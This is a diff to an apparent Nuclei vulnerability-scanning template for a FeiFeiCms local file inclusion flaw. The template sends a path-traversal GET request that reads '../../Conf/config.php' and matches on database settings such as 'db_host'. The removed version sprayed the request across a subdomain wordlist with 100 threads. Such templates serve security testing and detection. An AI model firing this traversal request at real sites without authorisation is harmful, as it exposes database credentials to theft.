@@ -1,26 +1,26 @@
 id: feifeicms-lfr
+
 info:
-  name: FeiFeiCms Local File Read
+  name: FeiFeiCms - Local File Inclusion
   author: princechaddha
   severity: high
-  tags: feifeicms,lfi
-  reference: |
+  description: FeiFeiCms is vulnerable to local file inclusion.
+  reference:
     - https://www.cnblogs.com/jinqi520/p/10202615.html
     - https://gitee.com/daicuo/feifeicms
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 1
+  tags: feifeicms,lfi
 
-requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?s=Admin-Data-down&id=../../Conf/config.php"
 
-    raw:
-      - |
-        GET /index.php?s=Admin-Data-down&id=../../Conf/config.php HTTP/1.1
-        Host: {{Subdomains}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
-        Accept-Encoding: gzip, deflate
-        Accept: */*
     matchers-condition: and
     matchers:
       - type: status
@@ -35,3 +35,4 @@ requests:
           - "db_host"
         condition: and
         part: body
+# digest: 4b0a00483046022100ab26eeb98ba8d320ad199871866ed5514177956e8d86eeac0eacd09a78b05c8e0221009fec8242fee97c43f49657b883787bd8c61e6af70fa57e0368e9564cb6e521b9:922c64590222798bb761d5b6d8e72950
